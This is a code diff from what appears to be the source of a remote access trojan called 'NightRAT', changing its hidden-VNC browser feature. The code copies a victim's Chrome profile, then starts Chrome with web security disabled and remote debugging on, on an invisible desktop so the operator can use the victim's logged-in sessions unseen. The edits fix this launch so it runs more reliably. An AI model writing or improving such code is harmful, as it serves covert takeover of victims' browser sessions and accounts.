@@ -1262,7 +1262,9 @@ static void launch_browser_thread(string browserName) {
     WCHAR tempPath[MAX_PATH];
     GetTempPathW(MAX_PATH, tempPath);
     // Use a more unique folder name to avoid conflicts with previous sessions
-    wstring destProfile = wstring(tempPath) + L"NightRAT_Chrome_" + to_wstring((unsigned long long)GetTickCount64());
+    WCHAR uniqueProfile[MAX_PATH];
+    swprintf(uniqueProfile, MAX_PATH, L"%sNightRAT_Chrome_%llu", tempPath, (unsigned long long)GetTickCount64());
+    wstring destProfile = uniqueProfile;
 
     if (PathFileExistsW(sourceProfile.c_str())) {
         send_status("Cloning profile (this may take a while)...");
@@ -1305,7 +1307,6 @@ static void launch_browser_thread(string browserName) {
         L"--disable-sync-preferences "
         L"--disable-translate "
         L"--disable-web-security "
-        L"--no-sandbox "
         L"--no-pings "
         L"--no-proxy-server "
         L"--remote-debugging-port=0";
@@ -1314,7 +1315,9 @@ static void launch_browser_thread(string browserName) {
     cmdLineBuf.push_back(L'\0');
 
     wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-    STARTUPINFOW si = { sizeof(si) };
+    STARTUPINFOW si;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
     si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_SHOW;
@@ -1325,9 +1328,11 @@ static void launch_browser_thread(string browserName) {
         chromeDir = chromeDir.substr(0, lastBackslash);
     }
 
-    PROCESS_INFORMATION pi = { 0 };
-    // Using CREATE_NEW_CONSOLE to match hvnc_run behavior and providing a working directory
-    if (CreateProcessW(NULL, cmdLineBuf.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, chromeDir.c_str(), &si, &pi)) {
+    PROCESS_INFORMATION pi;
+    memset(&pi, 0, sizeof(pi));
+
+    // Removing CREATE_NEW_CONSOLE as Chrome is a GUI app and it might interfere with session attachment
+    if (CreateProcessW(NULL, cmdLineBuf.data(), NULL, NULL, FALSE, 0, NULL, chromeDir.c_str(), &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         g_forceFullFrame = true;
